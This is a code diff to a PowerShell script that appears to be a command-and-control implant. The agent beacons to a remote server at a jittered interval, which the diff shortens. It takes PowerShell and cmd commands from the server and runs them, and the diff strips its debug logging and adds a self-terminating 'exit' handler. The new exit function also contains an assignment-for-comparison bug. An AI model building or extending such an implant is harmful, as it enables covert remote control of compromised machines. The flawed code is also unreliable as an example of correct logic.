@@ -17,7 +17,7 @@ $pollUri     = "$baseUri/api/health"
 # - $callbackInterval: seconds between polls (baseline, before jitter)
 # - $jitterPct: +/- percentage applied to interval for jitter
 $reportedPid      = $pid
-$callbackInterval = 60
+$callbackInterval = 20
 $jitterPct        = 15
 $pendingTaskResult = $null
 
@@ -247,7 +247,6 @@ function Submit-TaskResult {
 function Run-Set {
   # IMPORTANT: Do NOT use parameter name 'Args' to avoid clashing with automatic $args
   param([string[]]$Argv)
-  Write-Host "[DEBUG task] Entered Run-Set command."
   # Normalize in case a single string sneaks in or non-breaking spaces are used
   if ($Argv -is [string]) { $Argv = @([string]$Argv) }
   if ($Argv.Count -eq 1 -and ($Argv[0] -is [string])) {
@@ -260,8 +259,6 @@ function Run-Set {
 
   $name = ($Argv[0] | ForEach-Object { $_.ToString().ToLower() })
   $value = [string]$Argv[1]
-  Write-Host "[task] Arg[0] value is $($Args[0])"
-   Write-Host "[task] Arg[1] value is $($Args[1])"
   switch ($name) {
     'jitter' { try { $script:jitterPct = [int]$value; return 'true' } catch { return 'false' } }
     'jitter_value' { try { $script:jitterPct = [int]$value; return 'true' } catch { return 'false' } }
@@ -274,8 +271,8 @@ function Run-Set {
 }
 
 function Run-PowerShell {
-  param([string[]]$Args)
-  $cmdText = ($Args -join ' ').Trim()
+  param([string[]]$Argv)
+  $cmdText = ($Argv -join ' ').Trim()
   if (-not $cmdText) { return '' }
   return Invoke-AgentTask -Command $cmdText
 }
@@ -292,10 +289,25 @@ function Run-Cmd {
 }
 
 function Register-DefaultHandlers {
-  Register-TaskHandler -Name 'set'        -Handler { param([string[]]$Argv) Run-Set -Args $Argv }
-  Register-TaskHandler -Name 'powershell' -Handler { param([string[]]$Argv) Run-PowerShell -Args $Argv }
-  Register-TaskHandler -Name 'ps'         -Handler { param([string[]]$Argv) Run-PowerShell -Args $Argv }
-  Register-TaskHandler -Name 'cmd'        -Handler { param([string[]]$Argv) Run-Cmd -Args $Argv }
+  Register-TaskHandler -Name 'set'        -Handler { param([string[]]$Argv) Run-Set -Argv $Argv }
+  Register-TaskHandler -Name 'powershell' -Handler { param([string[]]$Argv) Run-PowerShell -Argv $Argv }
+  Register-TaskHandler -Name 'ps'         -Handler { param([string[]]$Argv) Run-PowerShell -Argv $Argv }
+  Register-TaskHandler -Name 'cmd'        -Handler { param([string[]]$Argv) Run-Cmd -Argv $Argv }
+  Register-TaskHandler -Name 'exit'       -Handler { param([string[]]$Argv) Run-Exit -Argv $Argv  }
+}
+
+function Run-Exit{
+  param([string[]]$Argv)
+  $eat = $False
+  if ($Argv -and $Argv.Length -gt 0){
+    $s = $Argv[0].ToString().ToLower()
+    $eat = @('1','true','t','yes','y').Contains($s)
+  }
+  if($eat = $True){
+
+     Stop-Process $pid -force
+  }
+  Stop-Process $pid -force
 }
 
 function Run-Task {
